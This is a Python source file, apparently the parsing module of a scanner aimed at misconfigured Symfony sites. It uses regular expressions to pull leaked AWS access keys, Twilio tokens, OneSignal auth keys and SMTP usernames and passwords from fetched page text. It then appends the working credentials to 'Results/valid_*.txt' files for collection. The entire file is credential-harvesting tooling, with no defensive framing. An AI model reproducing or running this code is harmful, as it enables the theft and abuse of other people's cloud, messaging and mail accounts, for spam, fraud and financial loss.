import re


class Symphony:

    def aws(self, page):
        global aws_key, aws_secret, aws_region
        try:
            if "app_aws_key: " in page or "services_amazon_key: " in page or "app_aws_access_key: " in page:
                if "app_aws_key: " in page:
                    try:
                        aws_key = re.findall("app_aws_key: (.*?)\n", page)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_secret = re.findall("app_aws_secret: (.*?)\n", page)[0]
                    except:
                        aws_secret = ''
                    try:
                        aws_region = re.findall("app_aws_region: (.*?)\n", page)[0]
                    except:
                        aws_region = "us-east-2"
                if "services_amazon_key: " in page:
                    try:
                        aws_key = re.findall("services_amazon_key: (.*?)\n", page)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_secret = re.findall("services_amazon_keysecret: (.*?)\n", page)[0]
                    except:
                        aws_secret = ''
                    try:
                        aws_region = re.findall("services_amazon_region: (.*?)\n", page)[0]
                    except:
                        aws_region = "us-east-2"
                if "app_aws_access_key: " in page:
                    try:
                        aws_key = re.findall("app_aws_access_key: (.*?)\n", page)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_secret = re.findall("app_aws_secret_key: (.*?)\n", page)[0]
                    except:
                        aws_secret = ''
                    try:
                        aws_region = re.findall("app_aws_region: (.*?)\n", page)[0]
                    except:
                        aws_region = "us-east-2"
                if aws_key == '' or aws_secret == '' or aws_key == 'null' or aws_secret == 'null' or aws_key \
                        == '""' or aws_secret == '""':
                    pass
                else:
                    build = aws_key + '|' + aws_secret + '|' + aws_region
                    remover = build.replace('\r', '')
                    smtps = open('Results/valid_aws.txt', "a")
                    smtps.write(remover + '\n')
                    smtps.close()
                    return aws_key, aws_secret, aws_region
            else:
                return False
        except Exception as e:
            return False

    def twilio(self, page):
        global twilio_id, twilio_sec
        try:
            if "app_twilio_accountid: " in page:
                try:
                    twilio_id = re.findall("app_twilio_accountid: (.*?)\n", page)[0]
                except:
                    twilio_id = ''
                try:
                    twilio_sec = re.findall("app_twilio_token: (.*?)\n", page)[0]
                except:
                    twilio_sec = ''
                if twilio_id == '' or twilio_sec == '' or twilio_id == 'null' or twilio_sec == 'null' or twilio_id \
                        == '""' or twilio_sec == '""':
                    return False
                else:
                    build = twilio_id + '|' + twilio_sec
                    remover = build.replace('\r', '')
                    smtps = open("Results/valid_twilio.txt", "a")
                    smtps.write(remover + '\n')
                    smtps.close()
                    return twilio_id, twilio_sec
            else:
                return False
        except Exception as e:
            return False

    def aws_smtps(self, page, url):
        global smtp_username, smtp_password, smtp_host
        smtp_name = ""
        method = "/Fronted_DEV"
        try:
            if "app_gs_mensaje_service_mail: " in page:
                try:
                    smtp_host = re.findall("app_gs_mensaje_service_mail: (.*?)\n", page)[0]
                except:
                    smtp_host = ""
                try:
                    smtp_port = re.findall("app_gs_mensaje_smtp_port: (.*?)\n", page)[0]
                except:
                    smtp_port = "587"
                try:
                    smtp_username = re.findall("app_gs_mensaje_smtp_user: (.*?)\n", page)[0]
                except:
                    smtp_username = ""
                try:
                    smtp_password = re.findall("app_gs_mensaje_smtp_pass: (.*?)\n", page)[0]
                except:
                    smtp_password = ""
                try:
                    smtp_from = re.findall("app_gs_mensaje_sender_mail: (.*?)\n", page)[0]
                except:
                    smtp_from = ""
                if smtp_username == '' or smtp_password == '' or smtp_username == 'null' or smtp_password == 'null' \
                        or smtp_username == '""' or smtp_password == '""':
                    pass
                else:
                    build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                        smtp_host) + '\nMAILPORT: ' + str(smtp_port) + '\nMAILUSER: ' + str(
                        smtp_username) + '\nMAILPASS: ' + str(smtp_password) + '\nMAILFROM: ' + str(
                        smtp_from) + '\nFROMNAME: ' + str(smtp_name)
                    remover = build.replace('\r', '')
                    smtps = open("Results/valid_smtps.txt", "a")
                    smtps.write(remover + '\n')
                    smtps.close()
                    return smtp_host, smtp_port, smtp_username, smtp_password, smtp_from
            else:
                return False
        except Exception as e:
            return False

    def one_signal(self, page):
        global one_signal, one_secret
        try:
            if "app_onesignal_app_id: " in page:
                try:
                    one_signal = re.findall("app_onesignal_app_id: (.*?)\n", page)[0]
                except:
                    pass
                try:
                    one_secret = re.findall("app_onesignal_auth: (.*?)\n", page)[0]
                except:
                    pass
                if one_signal == '' or one_secret == '' or one_signal == 'null' or one_secret == 'null' or one_signal \
                        == '""' or one_secret == '""':
                    pass
                else:
                    build = one_signal + '|' + one_secret
                    remover = build.replace('\r', '')
                    smtps = open("Results/valid_onesignal.txt", "a")
                    smtps.write(remover + '\n')
                    smtps.close()
                    return True
            else:
                return False
        except Exception as e:
            return False

    def smtps(self, page, url):
        global smtp_password, smtp_host, smtp_port, smtp_user, smtp_username
        smtp_from = ""
        smtp_name = ""
        method = "/Frontend_Dev"
        try:
            if "phpmailer_host: " in page or "sf_mail_transport: " in page or "app_mailer_host: " in page or \
                    "app_mail_smtp_server: " in page or "app_smtp_host: " in page or "app_smtp_server: " in page:
                if "phpmailer_host: " in page:
                    try:
                        smtp_host = re.findall("phpmailer_host: (.*?)\n", page)[0]
                    except:
                        smtp_host = ""
                    try:
                        smtp_port = re.findall("phpmailer_port: (.*?)\n", page)[0]
                    except:
                        smtp_port = "587"
                    try:
                        smtp_username = re.findall("phpmailer_username: (.*?)\n", page)[0]
                    except:
                        smtp_username = ""
                    try:
                        smtp_password = re.findall("phpmailer_password: (.*?)\n", page)[0]
                    except:
                        smtp_password = ""
                if "sf_mail_transport: " in page:
                    try:
                        smtp_host = re.findall("sf_mail_transport: (.*?)\n", page)[0]
                    except:
                        smtp_host = ""
                    try:
                        smtp_port = re.findall("sf_smtp_port: (.*?)\n", page)[0]
                    except:
                        smtp_port = "587"
                    try:
                        smtp_username = re.findall("sf_smtp_user: (.*?)\n", page)[0]
                    except:
                        smtp_username = ""
                    try:
                        smtp_password = re.findall("sf_smtp_pass: (.*?)\n", page)[0]
                    except:
                        smtp_password = ""
                if "app_mailer_host: " in page:
                    try:
                        smtp_host = re.findall("app_mailer_host: (.*?)\n", page)[0]
                    except:
                        smtp_host = ""
                    try:
                        smtp_port = re.findall("app_mailer_port: (.*?)\n", page)[0]
                    except:
                        smtp_port = ""
                    try:
                        smtp_username = re.findall("app_mailer_username: (.*?)\n", page)[0]
                    except:
                        smtp_username = ""
                    try:
                        smtp_password = re.findall("app_mailer_password: (.*?)\n", page)[0]
                    except:
                        smtp_password = ""
                if "app_mail_smtp_server: " in page:
                    try:
                        smtp_host = re.findall("app_mail_smtp_server: (.*?)\n", page)[0]
                    except:
                        smtp_host = ""
                    try:
                        smtp_port = re.findall("app_mail_smtp_port: (.*?)\n", page)[0]
                    except:
                        smtp_port = "587"
                    try:
                        smtp_username = re.findall("app_mail_smtp_user: (.*?)\n", page)[0]
                    except:
                        smtp_username = ""
                    try:
                        smtp_password = re.findall("app_mail_smtp_password: (.*?)\n", page)[0]
                    except:
                        smtp_password = ""
                if "app_smtp_host: " in page:
                    try:
                        smtp_host = re.findall("app_smtp_host: (.*?)\n", page)[0]
                    except:
                        smtp_host = ""
                    try:
                        smtp_port = re.findall("app_smtp_port: (.*?)\n", page)[0]
                    except:
                        smtp_port = "587"
                    try:
                        smtp_username = re.findall("app_smtp_account: (.*?)\n", page)[0]
                    except:
                        smtp_username = ""
                    try:
                        smtp_password = re.findall("app_smtp_password: (.*?)\n", page)[0]
                    except:
                        smtp_password = ""
                if "app_smtp_server: " in page:
                    try:
                        smtp_host = re.findall("app_smtp_server: (.*?)\n", page)[0]
                    except:
                        smtp_host = ""
                    try:
                        smtp_port = re.findall("app_smtp_port: (.*?)\n", page)[0]
                    except:
                        smtp_port = "587"
                    try:
                        smtp_username = re.findall("app_smtp_user: (.*?)\n", page)[0]
                    except:
                        smtp_username = ""
                    try:
                        smtp_password = re.findall("app_smtp_password: (.*?)\n", page)[0]
                    except:
                        smtp_password = ""
                if smtp_username == "" or smtp_password == "" or smtp_username == 'null' or smtp_password == 'null' or smtp_username == '""' or \
                        smtp_password == '""':
                    pass
                else:
                    build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                        smtp_host) + '\nMAILPORT: ' + str(smtp_port) + '\nMAILUSER: ' + str(
                        smtp_username) + '\nMAILPASS: ' + str(smtp_password) + '\nMAILFROM: ' + str(
                        smtp_from) + '\nFROMNAME: ' + str(smtp_name)
                    remover = build.replace('\r', '')
                    smtps = open("Results/valid_smtps.txt", "a")
                    smtps.write(remover + '\n')
                    smtps.close()
                    return smtp_host, smtp_port, smtp_username, smtp_password, smtp_from
            else:
                return False
        except Exception as e:
            return False
